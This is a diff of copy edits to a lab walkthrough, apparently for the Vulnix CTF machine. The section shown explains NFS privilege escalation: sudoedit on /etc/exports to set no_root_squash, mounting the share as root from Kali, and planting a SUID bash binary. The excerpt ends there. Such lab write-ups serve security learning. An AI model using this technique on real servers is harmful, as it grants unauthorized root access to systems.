@@ -291,7 +291,7 @@ vulnix@vulnix:~$
 
 ## Privileg Escalation Part 2
 
-We immediately see out sudo permissions :
+We immediately see our sudo permissions :
 
 ```bash
 vulnix@vulnix:~$ sudo -l
@@ -302,9 +302,9 @@ User vulnix may run the following commands on this host:
     (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
 ```
 
-it allows us to edit `/etc/exports` which is The primary configuration for the NFS server is the /etc/exports file.
+it allows us to edit `/etc/exports` with `sudoedit` which is The primary configuration for the NFS server.
 
-This is the file that you use to specify what directories you want to share with the NFS clients
+This is the file that you use to specify what directories you want to share with the NFS clients.
 
 ```bash
 vulnix@vulnix:~$ sudoedit /etc/exports
@@ -322,21 +322,21 @@ vulnix@vulnix:~$ sudoedit /etc/exports
 /home/vulnix    *(rw,root_squash)
 ```
 
-nfs has these two options :
+NFS has these two options :
 
 - root_squash : which does not allow the root use on the client to create file with root permissions (differentiates local root account with user root account)
 - no_root_squash : which allows root user on the client to create any file or binary with root permissions
 
 so we can simply change the line to `no_root_squash` and then restart the machine physically, this is the only option.
 
-so after booting up again we mount the `/home/vulnix` directory again but this time with our own root user :
+after booting up again we mount the `/home/vulnix` directory again but this time with our own root user :
 
 ```bash
 root@kali: mount 192.168.127.134:/home/vulnix /mnt/vulnix
 root@kali: cd /mnt/vulnix
 ```
 
-now we can put our own bash binary in to this shared folder and set SUID on it in order to run it on the victim machine :
+now we can put our own bash binary into this shared folder and set SUID on it in order to run it on the victim machine :
 
 ```bash
 root@kali(/mnt/vulnix): cp /bin/bash .
